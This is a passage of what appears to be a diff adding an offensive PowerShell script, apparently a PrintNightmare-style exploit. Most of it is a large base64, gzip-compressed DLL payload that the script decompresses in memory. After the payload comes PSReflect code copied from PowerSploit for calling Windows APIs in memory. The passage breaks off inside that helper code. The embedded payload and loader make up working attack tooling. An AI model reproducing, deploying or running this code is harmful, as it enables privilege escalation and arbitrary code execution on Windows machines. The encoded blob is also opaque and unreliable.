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")
+
+    # Decompress GZip data to get DLL bytes
+    $nightmare_ms = New-Object System.IO.MemoryStream -ArgumentList @(,$nightmare_data)
+    $ms = New-Object System.IO.MemoryStream
+    $gzs = New-Object System.IO.Compression.GZipStream -ArgumentList @($nightmare_ms, [System.IO.Compression.CompressionMode]::Decompress)
+    $gzs.CopyTo($ms)
+    $gzs.Close()
+    $nightmare_ms.Close()
+
+    return $ms.ToArray()
+}
+# ============================================================================
+# END OF EMBEDDED DLL PAYLOAD
+# ============================================================================
+
+########################################################
+# Stolen from PowerSploit: https://github.com/PowerShellMafia/PowerSploit
+########################################################
+
+########################################################
+#
+# PSReflect code for Windows API access
+# Author: @mattifestation
+#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
+#
+########################################################
+
+function New-InMemoryModule {
+<#
+.SYNOPSIS
+Creates an in-memory assembly and module
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+.DESCRIPTION
+When defining custom enums, structs, and unmanaged functions, it is
+necessary to associate to an assembly module. This helper function
+creates an in-memory module that can be passed to the 'enum',
+'struct', and Add-Win32Type functions.
+.PARAMETER ModuleName
+Specifies the desired name for the in-memory assembly and module. If
+ModuleName is not provided, it will default to a GUID.
+.EXAMPLE
+$Module = New-InMemoryModule -ModuleName Win32
+#>
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ModuleName = [Guid]::NewGuid().ToString()
+    )
+
+    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
+    $LoadedAssemblies = $AppDomain.GetAssemblies()
+
+    foreach ($Assembly in $LoadedAssemblies) {
+        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
+            return $Assembly
+        }
+    }
+
+    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
+    $Domain = $AppDomain
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
+
+    return $ModuleBuilder
+}
+
+# A helper function used to reduce typing while defining function
+# prototypes for Add-Win32Type.
+function func {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $DllName,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]
+        $FunctionName,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [Type]
+        $ReturnType,
+
+        [Parameter(Position = 3)]
+        [Type[]]
+        $ParameterTypes,
+
+        [Parameter(Position = 4)]
+        [Runtime.InteropServices.CallingConvention]
+        $NativeCallingConvention,
+
+        [Parameter(Position = 5)]
+        [Runtime.InteropServices.CharSet]
+        $Charset,
+
+        [String]
+        $EntryPoint,
+
+        [Switch]
+        $SetLastError
+    )
+
+    $Properties = @{
+        DllName = $DllName
+        FunctionName = $FunctionName
+        ReturnType = $ReturnType
+    }
+
+    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
+    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
+    if ($Charset) { $Properties['Charset'] = $Charset }
+    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
+    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
+
+    New-Object PSObject -Property $Properties
+}
+
+function Add-Win32Type
+{
+<#
+.SYNOPSIS
+Creates a .NET type for an unmanaged Win32 function.
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: func
+.DESCRIPTION
